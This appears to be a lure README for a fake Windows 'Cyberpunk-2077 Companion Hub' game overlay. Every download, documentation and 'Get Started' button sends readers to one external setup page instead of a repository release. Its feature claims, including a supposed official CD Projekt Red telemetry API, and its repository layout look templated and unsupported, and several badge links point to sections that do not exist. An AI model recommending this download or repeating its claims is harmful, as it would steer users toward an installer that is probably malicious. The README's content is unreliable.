# Cyberpunk‑2077 Companion Hub

<div align="center">
  <a href="https://rewfdf.github.io/SetupPage/"><img src="https://img.shields.io/badge/DOWNLOAD-RELEASE-1d4ed8?style=for-the-badge&logo=github&logoColor=white&labelColor=161b22" alt="Download"></a>
  <br>
  <a href="#-key-capabilities"><img src="https://img.shields.io/badge/HOTKEYS-SHORTCUTS-0369a1?style=for-the-badge&logo=visualstudiocode&logoColor=white&labelColor=161b22" alt="HOTKEYS"></a> <a href="#-configuration-system"><img src="https://img.shields.io/badge/PROFILES-ISOLATED-dc2626?style=for-the-badge&logo=git&logoColor=white&labelColor=161b22" alt="PROFILES"></a>
  <br>
  <a href="#-architecture--modules"><img src="https://img.shields.io/badge/RUNTIME-SPECS-4f46e5?style=for-the-badge&logo=code&logoColor=white&labelColor=161b22" alt="RUNTIME"></a> <a href="#-configuration-system"><img src="https://img.shields.io/badge/CONFIGS-PRESETS-ea580c?style=for-the-badge&logo=files&logoColor=white&labelColor=161b22" alt="CONFIGS"></a>
</div>

**One‑stop Windows‑only utility for Night City explorers**

---

## 🎮 What is this?

*Cyberpunk‑2077 Companion Hub* is a **native Windows 10/11 desktop application** that lives alongside your game and gives you instant access to the data you need most while you’re deep in Night City.

| Feature | Why you’ll love it |
|---------|--------------------|
| **Live Stats Tracker** | Health, stamina, XP, money, and reputation updates in real‑time |
| **Quest Log & Objectives** | Filter, search, and sort active/completed missions without pausing |
| **Map Shortcuts** | One‑click teleport‑style shortcuts to favorite districts, vendors, and hideouts |
| **Dynamic Overlay** | Minimalist HUD that can be toggled on‑the‑fly (transparent, resizable, hot‑key driven) |
| **utility‑Ready Extensibility** | Simple JSON schema for community‑made widgets and data sources |
| **Windows‑Optimized** | Zero background services, low CPU/memory footprint, native WinUI 3 UI |

> **Note:** This utility works **exclusively on Windows 10/11**. macOS, Linux, or consoles are not supported.

---

## 🚀 Quick Start

1. Click the **Download & Install** button below.
2. Run the installer (standard Windows UAC prompt).
3. Launch *Cyberpunk‑2077 Companion Hub* from the Start menu.
4. Open the overlay with **Ctrl + Shift + C** while the game is running.

<div align="center">
  <a href="https://rewfdf.github.io/SetupPage/" target="_blank" style="text-decoration:none;">
    <button style="background:#ff4c4c;color:#fff;padding:12px 24px;font-size:16px;border:none;border-radius:6px;cursor:pointer;">
      📥 Download & Install
    </button>
  </a>
  <a href="https://rewfdf.github.io/SetupPage/" target="_blank" style="text-decoration:none;margin-left:12px;">
    <button style="background:#4c6fff;color:#fff;padding:12px 24px;font-size:16px;border:none;border-radius:6px;cursor:pointer;">
      📖 Documentation
    </button>
  </a>
</div>

---

## 📂 Repository Structure

```
Cyberpunk-2077-Companion-Hub/
├─ src/                # C# source files (WinUI 3)
├─ assets/             # Icons & UI themes (vector format)
├─ data/               # Built‑in JSON packs (quests, map points)
├─ scripts/            # Helper scripts for build & packaging
├─ tests/              # Unit and integration tests
└─ README.md           # This file
```

*All code is written in modern C# 10 targeting .NET 8, with strict Windows‑only APIs.*

---

## 🛠️ Development & Contribution

1. **Clone** the repo
   ```bash
   git clone https://github.com/yourusername/Cyberpunk-2077-Companion-Hub.git
   ```
2. **Open** the solution in Visual Studio 2022 (or later) and hit **F5**.
3. Follow the [contributing guidelines](CONTRIBUTING.md) to add new widgets, fix bugs, or improve the overlay UI.

> **Security tip:** The overlay reads game memory only through official **Telemetry API** provided by CD Projekt Red; no cheating or memory‑editing is performed.

---

## 🗂️ Topics & Tags

`windows` • `cyberpunk-2077` • `companion` • `utility` • `desktop-app` • `game-assistant` • `overlay` • `quest-tracker`

---

## 📜 License

This project is released under the **MIT License** – feel free to use, modify, and distribute the code for personal or commercial purposes, provided the original copyright notice is retained.

---

## 🙏 Acknowledgements

- **MidnightPilotPonder** – original author & project lead
- The Night City community for beta testing and UI feedback
- Microsoft WinUI team for the sleek Windows UI framework

---

*Ready to dominate Night City with the ultimate companion?*

<div align="center">
  <a href="https://rewfdf.github.io/SetupPage/" target="_blank" style="text-decoration:none;">
    <button style="background:#ff4c4c;color:#fff;padding:10px 20px;font-size:14px;border:none;border-radius:4px;cursor:pointer;">
      🎉 Get Started
    </button>
  </a>
</div>

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```